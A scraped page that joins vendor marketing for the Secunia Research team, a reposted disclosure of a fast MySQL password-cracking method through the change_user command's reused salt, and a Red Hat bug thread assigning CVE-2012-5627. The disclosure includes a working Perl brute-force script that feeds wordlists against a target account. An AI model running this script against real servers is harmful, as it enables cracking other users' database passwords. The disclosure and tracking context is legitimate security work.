How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# MySQL Local/Remote FAST Account Password Cracking

FAST Cracking of MySQL account passwords locally or over the network (post-auth)

(to the maintainers: you don't need to patch this, looks alot like a
minor bug, prolly documented :D)

I found a method to crack mysql user passwords locally or over the
network pretty efficiently.
During Tests it was possible to test 5000 passwords per second over the network.
The method is as follows:

The attacker logs into the mysql server with an unprivileged account.
There is a command in mysql called change_user, this command can be used
as the name suggests to change a user during a mysql session.
Since mysql is very fast in doing this it is much more powerful to crack
passwords rather than reconnecting every time to the mysql server to
brute force passwords
(what would be VERY slow).
Since the SALT does not change (and this is the weak point) in the
change_user command
it is a convienent way to crack passwords. (When connecting to mysql
in each connection
attempt the SALT is always different and sent out by the server).

Below is an example script and an example which uses John the Ripper's
capabilities
to generate passwords.

The passwords "pass" for the user "crackme" is cracked in a matter of seconds.
(about 100000 passwords are tested in 20 seconds)
---
cracking script

use Net::MySQL;

$|=1;

my $mysql = Net::MySQL->new(
 hostname => '192.168.2.3',
 database => 'test',
 user     => "user",
 password => "secret",
 debug => 0,
);

$crackuser = "crackme";

while(<stdin>) {
chomp;
$currentpass = $_;

$vv = join "\0",
                $crackuser,
                "\x14".
                Net::MySQL::Password->scramble(
                        $currentpass, $mysql->{salt}, $mysql->{client_capabilities}
                ) . "\0";
if ($mysql->_execute_command("\x11", $vv) ne undef) {
        print "[*] Cracked! --> $currentpass\n";
        exit;
}
}

| [Description](show_bug.cgi?id=883719#c0)  Huzaifa S. Sidhpurwala    2012-12-05 06:59:58 UTC  ``` A vulnerability was found in the handling of password salt values in MySQL. When a user logs into MySQL a salt value is generated that is then used to prevent password guessing attacks (since the salt value must be known in order to send a password). This salt value is created at the start of a session and used for the entire session, once authenticated an attacker can use the MySQL "change_user" command to attempt to login as a different, as the salt value is known a password guessing attack will be much more efficient.  Reference: <http://seclists.org/fulldisclosure/2012/Dec/58>   ```  [Comment 1](show_bug.cgi?id=883719#c1)  Tom Lane    2012-12-05 14:35:15 UTC  ``` I'm not really convinced that this is a problem at all, or that selecting a new salt would make much difference.  Per the reference link, the main time savings is from not having to establish a new connection.  You still need a precalculated table of common password hashes, if you hope to avoid doing the hashing on-the-fly.   ```  [Comment 2](show_bug.cgi?id=883719#c2)  Jan Lieskovsky    2012-12-05 14:53:11 UTC  ``` MariaDB upstream bug:   <https://mariadb.atlassian.net/browse/MDEV-3915>   ```  [Comment 3](show_bug.cgi?id=883719#c3)  Jan Lieskovsky    2012-12-06 10:49:44 UTC  ``` The CVE identifier of [CVE-2012-5627](https://access.redhat.com/security/cve/CVE-2012-5627) has been assigned to this issue:   <http://www.openwall.com/lists/oss-security/2012/12/06/4>   ```  [Comment 4](show_bug.cgi?id=883719#c4)  Tomas Hoger    2012-12-11 11:22:07 UTC  ``` (In reply to [comment #1](show_bug.cgi?id=883719#c1)) > I'm not really convinced that this is a problem at all, or that selecting a > new salt would make much difference.
